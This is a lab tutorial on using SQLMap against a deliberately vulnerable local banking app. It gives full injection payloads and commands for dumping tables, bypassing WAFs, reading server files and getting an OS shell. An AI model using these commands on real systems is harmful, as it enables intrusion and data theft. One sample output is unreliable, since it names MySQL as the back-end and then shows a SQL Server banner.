# 🛡️ Testing SecureBank with SQLMap

**Automated SQL Injection Detection and Exploitation**

SQLMap is the world's most popular automated SQL injection testing tool. This guide teaches you how to use SQLMap to discover, exploit, and understand SQL injection vulnerabilities in SecureBank like professional penetration testers do.

---

## 📋 Table of Contents

1. [Overview](#overview)
2. [What is SQLMap?](#what-is-sqlmap)
3. [Installation & Setup](#installation--setup)
4. [Basic SQLMap Usage](#basic-sqlmap-usage)
5. [Testing SecureBank Login](#testing-securebank-login)
6. [Database Enumeration](#database-enumeration)
7. [Data Extraction](#data-extraction)
8. [Advanced Techniques](#advanced-techniques)
9. [Understanding SQLMap Output](#understanding-sqlmap-output)
10. [Comparing with Manual Testing](#comparing-with-manual-testing)
11. [Troubleshooting](#troubleshooting)
12. [Best Practices](#best-practices)

---

## 🎯 Overview

SQLMap is a powerful open-source penetration testing tool that automates the process of detecting and exploiting SQL injection vulnerabilities. It supports dozens of database management systems and can perform various attack techniques automatically.

### Why Use SQLMap?

SQLMap helps security professionals and learners by:

- **Automating detection**: Quickly test hundreds of injection points
- **Supporting many databases**: MySQL, PostgreSQL, Oracle, SQL Server, SQLite, and more
- **Using smart techniques**: Automatically tries different injection methods
- **Extracting data efficiently**: Can dump entire databases with a single command
- **Saving time**: What takes hours manually takes minutes with SQLMap
- **Teaching advanced SQL**: Shows you complex injection payloads you might not think of

### What Makes SQLMap Special?

1. **Fingerprinting**: Automatically detects the database type and version
2. **Injection techniques**: Tests 6 different SQL injection types
3. **DBMS-specific attacks**: Uses database-specific features for faster extraction
4. **Bypass methods**: Can evade basic Web Application Firewalls (WAFs)
5. **Post-exploitation**: Can execute commands, read files, and even get OS shells

### What You'll Learn

By the end of this guide, you'll be able to:

- ✅ Install and configure SQLMap on any platform
- ✅ Test web applications for SQL injection vulnerabilities
- ✅ Enumerate database structure (tables, columns)
- ✅ Extract sensitive data (usernames, passwords, account balances)
- ✅ Understand different SQL injection techniques
- ✅ Interpret SQLMap's verbose output
- ✅ Know when to use automated vs. manual testing
- ✅ Document findings professionally

---

## 🔍 What is SQLMap?

SQLMap is a Python-based penetration testing tool that automates SQL injection exploitation. It was created by Bernardo Damele and Miroslav Stampar and has been actively developed since 2006.

### How SQLMap Works

**1. Detection Phase**:
- Sends test payloads to identify injection points
- Analyzes responses to confirm vulnerability
- Fingerprints the database type and version

**2. Exploitation Phase**:
- Chooses optimal injection technique
- Extracts data using SQL queries
- Uses database-specific optimizations

**3. Post-Exploitation** (Optional):
- File system access
- Operating system command execution
- Database administrator takeover

### Supported Injection Techniques

SQLMap tests 6 different SQL injection types:

**1. Boolean-based blind**
- Uses TRUE/FALSE logic to extract data one bit at a time
- Works when application shows different responses for true/false
- Slower but works in many situations

**2. Time-based blind**
- Uses database sleep/delay functions
- Measures response time to extract data
- Works even when no visible difference in responses

**3. Error-based**
- Triggers database errors containing data
- Fast and efficient when errors are shown
- Common with verbose error messages

**4. UNION query-based**
- Uses SQL UNION to combine results
- Very fast for data extraction
- Requires knowing column count

**5. Stacked queries**
- Executes multiple SQL statements
- Allows INSERT, UPDATE, DELETE operations
- Not supported by all databases/configurations

**6. Out-of-band**
- Uses alternative channels (DNS, HTTP) to extract data
- Useful when direct response isn't visible
- Requires special configuration

### Supported Databases

SQLMap supports 20+ database management systems:

- MySQL / MariaDB
- PostgreSQL
- Microsoft SQL Server
- Oracle
- SQLite
- Microsoft Access
- IBM DB2
- Firebird
- SAP MaxDB
- And many more...

### SQLMap vs Manual Testing

**When to use SQLMap**:
- ✅ Initial vulnerability discovery
- ✅ Large applications with many parameters
- ✅ Time-constrained assessments
- ✅ Complete database enumeration
- ✅ Learning different injection techniques

**When to use manual testing** (Burp Suite):
- ✅ Complex authentication workflows
- ✅ Custom application logic
- ✅ Understanding the exact vulnerability
- ✅ Testing fixes and mitigations
- ✅ Bypassing advanced protections

**Best approach**: Use both! SQLMap for breadth, manual testing for depth.

---

## 📦 Installation & Setup

### Method 1: Install via Package Manager (Recommended)

**Kali Linux** (pre-installed):
```bash
sqlmap --version
```

**Ubuntu/Debian**:
```bash
sudo apt update
sudo apt install sqlmap
```

**macOS** (using Homebrew):
```bash
brew install sqlmap
```

**Arch Linux**:
```bash
sudo pacman -S sqlmap
```

### Method 2: Install from Source (Any Platform)

**Requirements**:
- Python 3.7 or higher
- Git

**Installation steps**:
```bash
# Clone the repository
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

# Navigate to directory
cd sqlmap-dev

# Run SQLMap
python3 sqlmap.py --version
```

### Method 3: Windows Installation

**Option A: Using Git**:
```cmd
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
python sqlmap.py --version
```

**Option B: Download ZIP**:
1. Visit [github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)
2. Click "Code" → "Download ZIP"
3. Extract the archive
4. Open Command Prompt in the extracted folder
5. Run `python sqlmap.py --version`

### Verify Installation

```bash
sqlmap --version
```

**Expected output**:
```
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.1#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[*] SQLMap 1.8.1
```

If you see this, SQLMap is installed correctly!

### Optional: Add to PATH

**Linux/macOS** (if installed from source):
```bash
# Add to ~/.bashrc or ~/.zshrc
export PATH="/path/to/sqlmap-dev:$PATH"

# Reload shell
source ~/.bashrc
```

**Windows**:
1. Right-click "This PC" → Properties
2. Advanced system settings → Environment Variables
3. Edit PATH → Add SQLMap directory
4. Restart Command Prompt

---

## 🚀 Basic SQLMap Usage

### Command Structure

```bash
sqlmap [options]
```

### Essential Options

**Target specification**:
- `-u URL` - Target URL
- `-r FILE` - Load HTTP request from file
- `--data=DATA` - POST data string

**Detection**:
- `--batch` - Never ask for user input (use defaults)
- `--level=LEVEL` - Testing thoroughness (1-5, default: 1)
- `--risk=RISK` - Risk of tests (1-3, default: 1)

**Enumeration**:
- `-b` - Retrieve DBMS banner
- `--current-user` - Current database user
- `--current-db` - Current database name
- `--tables` - List database tables
- `--columns` - List table columns
- `--dump` - Extract table data

**Output**:
- `-v VERBOSE` - Verbosity level (0-6)
- `--flush-session` - Clear session data
- `--fresh-queries` - Ignore cached results

### Simple Example

Test a URL with a GET parameter:

```bash
sqlmap -u "http://localhost:5000/api/login?username=test" --batch
```

**What this does**:
- Tests the `username` parameter for SQL injection
- Uses default settings
- Runs in batch mode (no prompts)

---

## 💉 Testing SecureBank Login

Now let's use SQLMap to test SecureBank's vulnerable login endpoint.

### Step 1: Identify the Target

SecureBank's login endpoint:
- **URL**: `http://localhost:5000/apps/securebank/api/red/auth/login`
- **Method**: POST
- **Content-Type**: application/json
- **Data**: `{"username":"test","password":"test"}`

### Step 2: Basic SQLMap Test

**Simple test** (won't work - SQLMap expects forms):
```bash
sqlmap -u "http://localhost:5000/apps/securebank/api/red/auth/login" \
  --data='{"username":"test","password":"test"}' \
  --batch
```

**Problem**: SQLMap doesn't automatically test JSON parameters. We need to mark injection points.

### Step 3: Mark Injection Points

Use `*` to tell SQLMap where to inject:

```bash
sqlmap -u "http://localhost:5000/apps/securebank/api/red/auth/login" \
  --data='{"username":"*","password":"test"}' \
  --headers="Content-Type: application/json" \
  --batch
```

**Expected output**:
```
[*] starting @ 14:32:15 /2024-02-07/

[14:32:15] [INFO] testing connection to the target URL
[14:32:15] [INFO] testing if the target URL content is stable
[14:32:16] [INFO] target URL content is stable
[14:32:16] [INFO] testing if POST parameter 'username' is dynamic
[14:32:16] [INFO] POST parameter 'username' appears to be dynamic
[14:32:16] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable
[14:32:16] [INFO] testing for SQL injection on POST parameter 'username'
```

**Screenshot Placeholder**: [Terminal showing SQLMap detecting injection in username parameter]

### Step 4: Full Detection Test

Run with higher verbosity to see what SQLMap is doing:

```bash
sqlmap -u "http://localhost:5000/apps/securebank/api/red/auth/login" \
  --data='{"username":"*","password":"test"}' \
  --headers="Content-Type: application/json" \
  --level=3 \
  --risk=2 \
  --batch \
  -v 3
```

**Options explained**:
- `--level=3` - Test more injection points and payloads
- `--risk=2` - Include potentially dangerous tests (still safe)
- `-v 3` - Show detailed output including payloads

### Step 5: Analyze Results

**Successful detection output**:
```
[14:32:18] [INFO] POST parameter 'username' is 'Boolean-based blind - WHERE or HAVING clause' injectable
[14:32:20] [INFO] POST parameter 'username' is 'Time-based blind' injectable
[14:32:22] [INFO] POST parameter 'username' is 'UNION query' injectable

POST parameter 'username' is vulnerable. Do you want to keep testing the others? [y/N] N

sqlmap identified the following injection point(s) with a total of 157 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: {"username":"test' OR 1=1-- -","password":"test"}

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
    Payload: {"username":"(SELECT 1 FROM (SELECT(SLEEP(5)))a)","password":"test"}

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: {"username":"test' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71767a7a71,0x...,0x716b706b71)-- -","password":"test"}
---
[14:32:22] [INFO] the back-end DBMS is MySQL
```

**Screenshot Placeholder**: [SQLMap output showing 3 different injection techniques detected]

### Step 6: Understanding the Detection

**Boolean-based blind**:
- Payload: `test' OR 1=1-- -`
- Tests if changing logic affects the response
- Useful for extracting data bit by bit

**Time-based blind**:
- Payload: `(SELECT 1 FROM (SELECT(SLEEP(5)))a)`
- Makes database sleep to confirm injection
- Works when no visible response difference

**UNION query**:
- Payload: `test' UNION ALL SELECT NULL,NULL...-- -`
- Combines attacker's query with original
- Fastest method for data extraction

**Why multiple types?**
- Different techniques work in different scenarios
- SQLMap chooses the fastest available method
- Provides redundancy if one method fails

---

## 🗄️ Database Enumeration

Once SQLMap confirms injection, we can enumerate the database structure.

### Step 1: Identify Database Type and Version

```bash
sqlmap -u "http://localhost:5000/apps/securebank/api/red/auth/login" \
  --data='{"username":"*","password":"test"}' \
  --headers="Content-Type: application/json" \
  --batch \
  -b
```

**Expected output**:
```
[*] Microsoft SQL Server 2019
web application technology: Python 3.11.0, Flask 2.3.0
back-end DBMS: Microsoft SQL Server 2019
banner: 'Microsoft SQL Server 2019 (RTM) - 15.0.2000.5'
```

### Step 2: Get Current Database Name

```bash
sqlmap -u "http://localhost:5000/apps/securebank/api/red/auth/login" \
  --data='{"username":"*","password":"test"}' \
  --headers="Content-Type: application/json" \
  --batch \
  --current-db
```

**Expected output**:
```
current database: 'securebank'
```

### Step 3: List All Databases

```bash
sqlmap -u "http://localhost:5000/apps/securebank/api/red/auth/login" \
  --data='{"username":"*","password":"test"}' \
  --headers="Content-Type: application/json" \
  --batch \
  --dbs
```

**Expected output**:
```
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] securebank
```

### Step 4: Enumerate Tables

List tables in the current database:

```bash
sqlmap -u "http://localhost:5000/apps/securebank/api/red/auth/login" \
  --data='{"username":"*","password":"test"}' \
  --headers="Content-Type: application/json" \
  --batch \
  --tables \
  -D securebank
```

**Expected output**:
```
Database: securebank
[5 tables]
+----------------+
| accounts       |
| transactions   |
| users          |
| settings       |
| audit_log      |
+----------------+
```

**Screenshot Placeholder**: [SQLMap output showing all tables in SecureBank database]

### Step 5: Enumerate Columns

Get columns for the `users` table:

```bash
sqlmap -u "http://localhost:5000/apps/securebank/api/red/auth/login" \
  --data='{"username":"*","password":"test"}' \
  --headers="Content-Type: application/json" \
  --batch \
  --columns \
  -D securebank \
  -T users
```

**Expected output**:
```
Database: securebank
Table: users
[7 columns]
+-------------+--------------+
| Column      | Type         |
+-------------+--------------+
| id          | int          |
| username    | varchar(80)  |
| password    | varchar(200) |
| full_name   | varchar(100) |
| email       | varchar(120) |
| is_admin    | tinyint(1)   |
| created_at  | datetime     |
+-------------+--------------+
```

### Step 6: Enumerate All at Once

Get complete database schema:

```bash
sqlmap -u "http://localhost:5000/apps/securebank/api/red/auth/login" \
  --data='{"username":"*","password":"test"}' \
  --headers="Content-Type: application/json" \
  --batch \
  --schema \
  -D securebank
```

**This shows**:
- All tables
- All columns in each table
- Data types
- Relationships (if visible)

---

## 📊 Data Extraction

Now let's extract sensitive data from the database.

### Step 1: Dump All Users

Extract all data from the `users` table:

```bash
sqlmap -u "http://localhost:5000/apps/securebank/api/red/auth/login" \
  --data='{"username":"*","password":"test"}' \
  --headers="Content-Type: application/json" \
  --batch \
  --dump \
  -D securebank \
  -T users
```

**Expected output**:
```
Database: securebank
Table: users
[4 entries]
+----+----------+--------------------------------------------------------------+-------------------+----------------------+----------+---------------------+
| id | username | password                                                     | full_name         | email                | is_admin | created_at          |
+----+----------+--------------------------------------------------------------+-------------------+----------------------+----------+---------------------+
| 1  | admin    | $2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewY5ND2CJZtzUmMK | Admin User        | admin@securebank.com | 1        | 2024-01-15 10:00:00 |
| 2  | alice    | $2b$12$K8v2c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewY5ND2CJZtzUmMK | Alice Johnson     | alice@example.com    | 0        | 2024-01-16 11:30:00 |
| 3  | bob      | $2b$12$M9v3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewY5ND2CJZtzUmMK | Bob Williams      | bob@example.com      | 0        | 2024-01-17 09:15:00 |
| 4  | charlie  | $2b$12$N1v4c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewY5ND2CJZtzUmMK | Charlie Brown     | charlie@example.com  | 0        | 2024-01-18 14:45:00 |
+----+----------+--------------------------------------------------------------+-------------------+----------------------+----------+---------------------+
```

**Screenshot Placeholder**: [SQLMap dumping user table with all credentials]

**Important**: Passwords are hashed (bcrypt), so we've extracted the hashes, not plaintext passwords.

### Step 2: Dump Account Balances

Extract data from the `accounts` table:

```bash
sqlmap -u "http://localhost:5000/apps/securebank/api/red/auth/login" \
  --data='{"username":"*","password":"test"}' \
  --headers="Content-Type: application/json" \
  --batch \
  --dump \
  -D securebank \
  -T accounts
```

**Expected output**:
```
Database: securebank
Table: accounts
[4 entries]
+----+---------+----------------+---------------+----------+
| id | user_id | account_number | account_type  | balance  |
+----+---------+----------------+---------------+----------+
| 1  | 1       | 1000000001     | checking      | 25000.00 |
| 2  | 2       | 1000000002     | checking      | 5000.00  |
| 3  | 3       | 1000000003     | savings       | 3000.00  |
| 4  | 4       | 1000000004     | checking      | 10000.00 |
+----+---------+----------------+---------------+----------+
```

**Real-world impact**: We now know everyone's account balance!

### Step 3: Dump Specific Columns Only

Extract just usernames and emails:

```bash
sqlmap -u "http://localhost:5000/apps/securebank/api/red/auth/login" \
  --data='{"username":"*","password":"test"}' \
  --headers="Content-Type: application/json" \
  --batch \
  --dump \
  -D securebank \
  -T users \
  -C username,email
```

**Expected output**:
```
Database: securebank
Table: users
[4 entries]
+----------+----------------------+
| username | email                |
+----------+----------------------+
| admin    | admin@securebank.com |
| alice    | alice@example.com    |
| bob      | bob@example.com      |
| charlie  | charlie@example.com  |
+----------+----------------------+
```

### Step 4: Dump with Conditions

Extract only admin users:

```bash
sqlmap -u "http://localhost:5000/apps/securebank/api/red/auth/login" \
  --data='{"username":"*","password":"test"}' \
  --headers="Content-Type: application/json" \
  --batch \
  --dump \
  -D securebank \
  -T users \
  --where="is_admin=1"
```

### Step 5: Dump Entire Database

Extract all tables and data:

```bash
sqlmap -u "http://localhost:5000/apps/securebank/api/red/auth/login" \
  --data='{"username":"*","password":"test"}' \
  --headers="Content-Type: application/json" \
  --batch \
  --dump \
  -D securebank
```

**Warning**: This can take a long time on large databases!

### Step 6: Save Results to File

SQLMap automatically saves results to:
- **Linux/macOS**: `~/.local/share/sqlmap/output/localhost/`
- **Windows**: `%USERPROFILE%\.sqlmap\output\localhost\`

Files include:
- `log` - Full session log
- `dump/securebank/` - Extracted data in CSV format

**Manually specify output**:
```bash
sqlmap ... --dump --dump-file=/tmp/securebank_dump.csv
```

---

## 🔬 Advanced Techniques

### Technique 1: Testing Password Parameter

Test if password is also injectable:

```bash
sqlmap -u "http://localhost:5000/apps/securebank/api/red/auth/login" \
  --data='{"username":"admin","password":"*"}' \
  --headers="Content-Type: application/json" \
  --batch
```

**Result**: Usually only username is tested first, but good to verify both.

### Technique 2: Using Captured Burp Request

Save a request from Burp Suite to a file:

**request.txt**:
```
POST /apps/securebank/api/red/auth/login HTTP/1.1
Host: localhost:5000
Content-Type: application/json
Content-Length: 45

{"username":"test","password":"test"}
```

Then run SQLMap:

```bash
sqlmap -r request.txt --batch
```

Mark injection point in the file with `*`:
```
{"username":"*","password":"test"}
```

### Technique 3: Bypassing WAF Detection

If SQLMap is detected/blocked, try:

**Randomize user agent**:
```bash
sqlmap ... --random-agent
```

**Add delay between requests**:
```bash
sqlmap ... --delay=2
```

**Use tamper scripts** (modify payloads):
```bash
sqlmap ... --tamper=space2comment
```

**Common tamper scripts**:
- `space2comment` - Replace spaces with comments `/**/`
- `charencode` - URL encode characters
- `between` - Replace `>` with `NOT BETWEEN 0 AND #`
- `apostrophemask` - Replace `'` with `%EF%BC%87`

### Technique 4: OS Command Execution (Advanced)

**⚠️ WARNING**: Only use on authorized test systems!

If database user has sufficient privileges:

```bash
sqlmap -u "http://localhost:5000/apps/securebank/api/red/auth/login" \
  --data='{"username":"*","password":"test"}' \
  --headers="Content-Type: application/json" \
  --batch \
  --os-shell
```

**This can**:
- Execute operating system commands
- Read/write files on the server
- Completely compromise the system

### Technique 5: Reading Server Files

Extract server configuration files:

```bash
sqlmap -u "http://localhost:5000/apps/securebank/api/red/auth/login" \
  --data='{"username":"*","password":"test"}' \
  --headers="Content-Type: application/json" \
  --batch \
  --file-read="/etc/passwd"
```

**Common files to read**:
- `/etc/passwd` - User accounts (Linux)
- `C:\Windows\System32\drivers\etc\hosts` - Hosts file (Windows)
- Application config files (database credentials!)

### Technique 6: Testing Multiple Parameters at Once

```bash
sqlmap -u "http://localhost:5000/apps/securebank/api/red/auth/login" \
  --data='{"username":"*","password":"*"}' \
  --headers="Content-Type: application/json" \
  --batch
```

SQLMap will test both parameters.

### Technique 7: Using Session Files

SQLMap caches results. To use cached data:

```bash
sqlmap ... --batch  # First run, creates session
```

Next time, SQLMap automatically uses cached data for faster execution.

**Clear cache**:
```bash
sqlmap ... --flush-session
```

**Force fresh queries**:
```bash
sqlmap ... --fresh-queries
```

---

## 📖 Understanding SQLMap Output

### Verbosity Levels

Control output detail with `-v` flag:

**Level 0** (default) - Minimal output:
```
[*] starting @ 14:32:15
[*] POST parameter 'username' is vulnerable
```

**Level 1** - Show basic info:
```
[*] testing connection to the target URL
[*] testing if POST parameter 'username' is dynamic
[*] POST parameter 'username' appears to be dynamic
```

**Level 2** - Show debug messages:
```
[DEBUG] declared web page charset 'utf-8'
[DEBUG] performed 157 queries
```

**Level 3** - Show payloads:
```
[PAYLOAD] test' AND 1=1-- -
[PAYLOAD] test' AND 1=2-- -
```

**Level 4** - Show HTTP requests:
```
[TRAFFIC OUT] POST http://localhost:5000/...
POST /apps/securebank/api/red/auth/login HTTP/1.1
```

**Level 5** - Show HTTP responses:
```
[TRAFFIC IN] HTTP/1.1 200 OK
{"success": true, "user": {...}}
```

**Level 6** - Show everything (very verbose)

### Understanding Detection Messages

**"Parameter appears to be dynamic"**:
```
[INFO] POST parameter 'username' appears to be dynamic
```
**Meaning**: The response changes when the parameter value changes. Good sign for injection.

**"Heuristic test shows might be injectable"**:
```
[INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable
```
**Meaning**: Quick syntax checks suggest injection is possible. Not confirmed yet.

**"Parameter is vulnerable"**:
```
[INFO] POST parameter 'username' is 'Boolean-based blind' injectable
```
**Meaning**: Confirmed SQL injection using boolean logic tests.

**"Back-end DBMS is MySQL"**:
```
[INFO] the back-end DBMS is MySQL
```
**Meaning**: Database fingerprinted as MySQL.

### Understanding Payload Output

**Boolean-based payload**:
```
Payload: {"username":"test' OR 1=1-- -","password":"test"}
```
**What it does**: Makes the WHERE clause always true, bypassing authentication.

**Time-based payload**:
```
Payload: {"username":"(SELECT 1 FROM (SELECT(SLEEP(5)))a)","password":"test"}
```
**What it does**: Delays the response by 5 seconds if injection works.

**UNION payload**:
```
Payload: {"username":"test' UNION ALL SELECT NULL,NULL,CONCAT(0x71,...)-- -","password":"test"}
```
**What it does**: Combines attacker's SELECT with original query to extract data.

### Reading the Session Log

SQLMap saves detailed logs:

```bash
cat ~/.local/share/sqlmap/output/localhost/log
```

**Log sections**:
1. **Target URL and parameters**
2. **Detection tests performed**
3. **Successful injection techniques**
4. **Database fingerprinting**
5. **Enumeration queries**
6. **Extracted data**

---

## ⚖️ Comparing with Manual Testing

### SQLMap Advantages

**Speed**:
- SQLMap: Tests 100+ payloads in minutes
- Manual: Testing 10 payloads takes 30+ minutes

**Coverage**:
- SQLMap: Tests 6 injection techniques automatically
- Manual: Usually test 1-2 techniques

**Database-specific**:
- SQLMap: Uses optimal queries for each DBMS
- Manual: Generic queries, less efficient

**Automation**:
- SQLMap: One command to dump entire database
- Manual: Many requests, complex queries

### Manual Testing Advantages

**Understanding**:
- Manual: You learn exactly how the injection works
- SQLMap: "Black box" - you may not understand the technique

**Custom scenarios**:
- Manual: Handle complex authentication, CSRF tokens
- SQLMap: May struggle with non-standard applications

**Stealth**:
- Manual: Fine-grained control over requests
- SQLMap: Generates lots of traffic, easily detected

**Precision**:
- Manual: Test exactly what you want
- SQLMap: May test more than necessary

### Best Practice: Use Both

**Recommended workflow**:

1. **Use SQLMap first** for quick discovery:
   ```bash
   sqlmap -u "..." --batch --tables
   ```

2. **Verify manually** in Burp Suite:
   - Understand the exact injection point
   - Test the specific payload
   - Learn how it works

3. **Use SQLMap for extraction** (faster):
   ```bash
   sqlmap -u "..." --dump -D securebank -T users
   ```

4. **Document findings** with both:
   - SQLMap output for comprehensive data
   - Manual screenshots for explanation

**Example comparison**:

**Task**: Extract all usernames

**SQLMap** (5 seconds):
```bash
sqlmap -u "..." --dump -D securebank -T users -C username
```

**Manual** (30+ minutes):
1. Test injection in Burp Repeater
2. Determine number of columns for UNION
3. Craft UNION SELECT payload
4. Extract each username one by one
5. Compile results

**Both are valuable** - SQLMap for efficiency, manual for learning!

---

## 🔧 Troubleshooting

### Issue 1: SQLMap Not Detecting Injection

**Symptom**:
```
[WARNING] POST parameter 'username' does not appear to be injectable
```

**Solutions**:

1. **Increase level and risk**:
   ```bash
   sqlmap ... --level=5 --risk=3
   ```

2. **Manually mark injection point with `*`**:
   ```bash
   --data='{"username":"*","password":"test"}'
   ```

3. **Try different techniques**:
   ```bash
   sqlmap ... --technique=BEUST
   ```
   (B=Boolean, E=Error, U=Union, S=Stacked, T=Time)

4. **Specify DBMS** (if you know it):
   ```bash
   sqlmap ... --dbms=MySQL
   ```

### Issue 2: Connection Errors

**Symptom**:
```
[ERROR] unable to connect to the target URL
```

**Solutions**:

1. **Verify target is running**:
   ```bash
   curl http://localhost:5000/apps/securebank/api/red/auth/login
   ```

2. **Check URL is correct** (common typos):
   - `/api/red/` not `/api/blue/`
   - `localhost` not `127.0.0.1` (may matter for cookies)

3. **Add timeout**:
   ```bash
   sqlmap ... --timeout=30
   ```

### Issue 3: JSON Parsing Errors

**Symptom**:
```
[ERROR] invalid JSON syntax
```

**Solutions**:

1. **Escape quotes properly**:
   ```bash
   --data="{\"username\":\"*\",\"password\":\"test\"}"
   ```

2. **Use single quotes**:
   ```bash
   --data='{"username":"*","password":"test"}'
   ```

3. **Save to file and use `-r`**:
   ```bash
   sqlmap -r request.txt
   ```

### Issue 4: False Positives

**Symptom**: SQLMap says vulnerable, but manual test fails

**Solutions**:

1. **Check payload carefully**:
   ```bash
   sqlmap ... -v 3  # Show payloads
   ```

2. **Test manually in Burp**:
   - Copy the exact payload
   - Test in Repeater

3. **Clear session and retest**:
   ```bash
   sqlmap ... --flush-session
   ```

### Issue 5: Extraction Very Slow

**Symptom**: Data extraction taking hours

**Solutions**:

1. **Use faster technique**:
   ```bash
   sqlmap ... --technique=U  # UNION only (fastest)
   ```

2. **Increase threads** (Professional databases):
   ```bash
   sqlmap ... --threads=10
   ```

3. **Extract specific columns only**:
   ```bash
   sqlmap ... -C username,password  # Not all columns
   ```

4. **Extract row range**:
   ```bash
   sqlmap ... --start=1 --stop=100  # First 100 rows
   ```

### Issue 6: SQLMap Detected/Blocked

**Symptom**: 403 Forbidden or CAPTCHA appears

**Solutions**:

1. **Random user agent**:
   ```bash
   sqlmap ... --random-agent
   ```

2. **Add delay**:
   ```bash
   sqlmap ... --delay=3
   ```

3. **Use tamper scripts**:
   ```bash
   sqlmap ... --tamper=space2comment,between
   ```

4. **Manual testing** (more stealthy):
   - Use Burp Suite instead
   - Control request rate manually

---

## ✅ Best Practices

### For Learning

1. **Start simple**:
   ```bash
   sqlmap -u "..." --batch
   ```
   Don't use all options at once.

2. **Increase verbosity**:
   ```bash
   sqlmap ... -v 3
   ```
   Understand what SQLMap is doing.

3. **Compare with manual**:
   - Run SQLMap
   - Try the same payload in Burp
   - Understand why it works

4. **Read the documentation**:
   ```bash
   sqlmap --help
   man sqlmap
   ```

### For Professional Testing

1. **Get permission first**:
   - Written authorization
   - Defined scope
   - Contact information

2. **Document everything**:
   - Save all output with `--output-dir`
   - Take screenshots
   - Note timestamps

3. **Verify findings**:
   - Don't trust SQLMap blindly
   - Manually verify critical findings
   - Rule out false positives

4. **Limit scope**:
   ```bash
   sqlmap ... --technique=BEU  # No stacked queries (safer)
   ```

5. **Be mindful of load**:
   ```bash
   sqlmap ... --threads=1 --delay=1
   ```
   Don't crash production systems!

### For SecureBank Practice

1. **Test both Red and Blue**:
   - Red Team: Should find injection
   - Blue Team: Should be protected

2. **Compare results**:
   - Why did Red Team fail?
   - How did Blue Team prevent it?

3. **Try different payloads**:
   - Don't just use SQLMap defaults
   - Create custom payloads

4. **Document learning**:
   - What worked?
   - What didn't?
   - Why?

### Security and Ethics

1. **Only test authorized systems**:
   - SecureBank: ✅ Authorized
   - Real banking sites: ❌ Illegal

2. **Don't use on production**:
   - Test environments only
   - Use test data

3. **Report responsibly**:
   - If you find real vulnerabilities
   - Follow responsible disclosure
   - Give time for fixes

4. **Don't share exploits publicly**:
   - Keep proof-of-concepts private
   - Share responsibly with security teams

---

## 🎓 Conclusion

You've learned how to use SQLMap to:

- ✅ Detect SQL injection vulnerabilities automatically
- ✅ Enumerate database structure (databases, tables, columns)
- ✅ Extract sensitive data (users, passwords, account balances)
- ✅ Understand different injection techniques
- ✅ Interpret SQLMap's detailed output
- ✅ Combine automated and manual testing
- ✅ Troubleshoot common issues
- ✅ Follow professional security testing practices

### Key Takeaways

**Why SecureBank is vulnerable**:
- User input concatenated directly into SQL queries
- No parameterized queries or prepared statements
- No input validation or sanitization

**Why SQLMap is powerful**:
- Automates tedious manual testing
- Tests multiple techniques simultaneously
- Optimized for speed and efficiency
- Database-agnostic (works with many DBMSs)

**Why manual testing still matters**:
- Deeper understanding of vulnerabilities
- Handle complex scenarios SQLMap can't
- More control and stealth
- Better for learning fundamentals

### Next Steps

1. **Practice more**:
   - Test all SecureBank endpoints
   - Try Blue Team (should be protected)
   - Experiment with different SQLMap options

2. **Learn SQL better**:
   - Understand the queries SQLMap generates
   - Practice writing SQL injection payloads manually
   - Study database-specific features

3. **Explore other tools**:
   - Burp Suite (manual testing)
   - OWASP ZAP (automated scanning)
   - Custom scripts (Python + requests)

4. **Real-world practice**:
   - Join bug bounty programs (legally)
   - Practice on vulnerable applications (DVWA, WebGoat)
   - Get certified (CEH, OSCP, OSWE)

### Additional Resources

- **SQLMap Wiki**: [github.com/sqlmapproject/sqlmap/wiki](https://github.com/sqlmapproject/sqlmap/wiki)
- **SQL Injection Guide**: [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- **Practice Labs**: 
  - PortSwigger Academy (free)
  - DVWA (Damn Vulnerable Web Application)
  - SQLi-Labs
- **Bug Bounty**: HackerOne, Bugcrowd (legal practice)

### Final Words

SQLMap is an incredibly powerful tool, but remember:

**With great power comes great responsibility.**

- Only test authorized systems
- Understand what you're doing
- Report findings responsibly
- Use your skills to make the internet safer

SQL injection remains one of the most critical web vulnerabilities. By learning SQLMap and understanding SQL injection deeply, you're developing valuable skills that will help you:

- Secure your own applications
- Find vulnerabilities before attackers do
- Build a career in cybersecurity
- Contribute to a safer internet

**Happy (Ethical) Hacking! 🔒**

---

**Pro Tip**: The best security professionals don't just run tools - they understand the vulnerabilities deeply. Use SQLMap to save time, but always understand *why* it works. That's what separates script kiddies from security experts.
